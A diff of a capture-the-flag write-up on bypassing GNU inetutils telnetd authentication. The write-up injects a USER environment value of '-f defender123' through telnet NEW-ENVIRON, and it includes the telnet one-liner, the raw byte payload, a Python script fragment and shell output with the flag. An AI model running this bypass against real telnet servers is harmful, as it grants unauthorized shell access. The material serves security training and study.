@@ -15,8 +15,6 @@ description: |
 tags: ["network", "misc"]
 ---
 
-# CDDC2026 — Telnet "defender123" — Writeup
-
 **Category:** Network / Misc
 **Target:** `nc cddc2026.xyz 2323`
 **Flag:** `CDDC2026{t3ln3t_n3w_3nv1r0n_byp4ss_2026}`
@@ -51,9 +49,10 @@ The decisive hint comes from the **connection itself**: immediately on connect, 
 
 ### Initial connect
 
-```
+```bash
 $ nc cddc2026.xyz 2323
 (raw bytes) ff fd 18 ff fd 20 ff fd 23 ff fd 27 ff fd 24 ...
+
 ```
 
 Decoding the telnet IAC commands the server sends:
@@ -69,9 +68,11 @@ Decoding the telnet IAC commands the server sends:
 After negotiating, the banner appears:
 
 ```
+
 Linux 6.17.0-1017-aws (223cdbd0c32f) (pts/N)
 
 223cdbd0c32f login:
+
 ```
 
 It is a stock GNU inetutils `telnetd` fronting `/usr/bin/login`.
@@ -100,13 +101,17 @@ GNU inetutils `telnetd` passes the client-supplied **`USER`** environment variab
 If the client sets:
 
 ```
+
 USER=-f defender123
+
 ```
 
 then `telnetd` ends up invoking:
 
 ```
+
 login -f defender123
+
 ```
 
 → `login` treats `defender123` as pre-authenticated and drops straight to a shell, **no password required**.
@@ -125,6 +130,7 @@ With a real telnet client, `-a` (attempt automatic login) sends the local `USER`
 
 ```bash
 USER="-f defender123" telnet -a cddc2026.xyz 2323
+
 ```
 
 ### Doing it by hand (no telnet client available)
@@ -136,17 +142,21 @@ I had no telnet binary on the host, so I implemented the NEW-ENVIRON subnegotiat
 3. Client replies with the injected `USER`:
 
 ```
+
 IAC SB NEW-ENVIRON IS  VAR "USER"  VALUE "-f defender123"  IAC SE
+
 ```
 
 Byte-level (NEW-ENVIRON sub-codes: IS=0, SEND=1, VAR=0, VALUE=1):
 
 ```
+
 ff fa 27 00 00 55 53 45 52 01 2d 66 20 64 65 66 65 6e 64 65 72 31 32 33 ff f0
 └IAC SB NEW-ENVIRON
         IS=00
            VAR=00
               "USER"            VALUE=01 "-f defender123"            IAC SE
+
 ```
 
 All other `DO` options are answered `WONT`; server `WILL ECHO/SGA` → `DO`. After this exchange `telnetd` execs `login -f defender123` and we land on a shell prompt instead of `login:`.
@@ -154,6 +164,7 @@ All other `DO` options are answered `WONT`; server `WILL ECHO/SGA` → `DO`. Aft
 ### Result
 
 ```
+
 Linux 6.17.0-1017-aws (223cdbd0c32f) (pts/10)
 $ id
 uid=1000(defender123) gid=1000(defender123) groups=1000(defender123)
@@ -161,6 +172,7 @@ $ ls -la
 -r--r----- 1 root defender123 41 May 12 04:51 flag.txt
 $ cat flag.txt
 CDDC2026{t3ln3t_n3w_3nv1r0n_byp4ss_2026}
+
 ```
 
 The flag (`t3ln3t_n3w_3nv1r0n_byp4ss`) confirms the intended path.
@@ -213,6 +225,7 @@ def run(uservalue):
     s.close()
 
 run("-f defender123")
+
 ```
 
 ---
